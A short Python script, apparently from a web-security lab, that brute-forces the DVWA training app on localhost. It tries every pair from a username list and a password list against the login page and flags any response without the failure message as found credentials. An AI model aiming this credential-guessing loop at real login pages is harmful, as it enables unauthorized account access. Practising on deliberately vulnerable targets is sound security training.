# try name / value combos
# don't know how to 

import argparse
import urllib3 # https://urllib3.readthedocs.io/en/latest/user-guide.html

http = urllib3.PoolManager()

# handle command line input arguments
parser = argparse.ArgumentParser()
parser.add_argument('users', type=str, help="this is the username file")
parser.add_argument('passwords', type=str, help="this is the passwords file")
parser.add_argument('phpsessid', type=str, help="this is the phpsessid for dvwa")
args = parser.parse_args()

# load user name and password files
with open(args.users, "r") as f:
    names = f.read().split("\n")

with open(args.passwords, "r") as f:
    creds = f.read().split("\n")

# clear previous runs of script
with open('responses.txt', 'w') as f:
    f.write('')

# go through name / password combinations
for name in names:
    for cred in creds:
        try:
            # create the request
            resp = http.request(
                "GET",
                f'http://127.0.0.1/dvwa/vulnerabilities/brute/index.php?username={name}&password={cred}&Login=Login',
                retries=False,
                headers={
                    "Cookie": f"security=low; PHPSESSID={args.phpsessid}"
                }
            )
            # filter the bad login phrase
            if "Username and/or password incorrect." not in resp.data.decode('utf-8'):
                print('creds found:')
                print(name+':'+cred)
            # write all responses to file
            print(resp.read())
            with open("responses.txt", "ab") as f:
                f.write(resp.data)
        # show any exception as raise it
        except BaseException as err:
            print(f'Unexpected {err=}, {type(err)=}')
            raise